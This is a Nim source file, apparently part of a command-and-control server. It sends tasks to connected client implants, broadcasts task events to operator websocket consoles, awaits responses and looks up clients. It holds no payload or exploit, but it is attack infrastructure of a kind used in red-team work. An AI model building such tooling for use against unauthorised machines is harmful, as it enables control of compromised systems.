import std/[
  asyncdispatch, 
  json
]

import ws

import types, logging, events

proc sendClientTask*(client: C2Client, taskName: string, jData: JsonNode = nil): Future[Task] {.async.} =
  if not client.connected:
    errorLog "can't send task to disconnected client: " & $client
    return
  var data: JsonNode
  if jData.isNil:
    data = %*[]
  else: 
    data = jData

  let createdTask = Task(
    client: client,
    id: len(client.server.tasks),
    action: taskName,
    status: TaskCreated,
    arguments: data,
    future: new (ref Future[void]),
    output: %*{}
  )

  client.server.tasks.add(createdTask)

  for wsConnection in client.server.wsConnections:
    discard wsConnection.send($(%*{
      "event": "newtask",
      "data": %createdTask
    }))
  
  onClientTasked(client, createdTask)
  infoLog "tasked " & $client & " with " & taskName
  prompt(client.server)
  return createdTask

proc awaitResponse*(task: Task) {.async.} =
  if task.future[].isNil():
    task.future[] = newFuture[void]()
  await task.future[]

proc askToIdentify*(client: C2Client) {.async.} =
  discard await client.sendClientTask("identify")

proc getClientByHash*(server: C2Server, hash: string): C2Client =
  for client in server.clients: 
    if client.hash == hash: return client

proc getClientById*(server: C2Server, id: string): C2Client =
  for client in server.clients: 
    if client.id == id: return client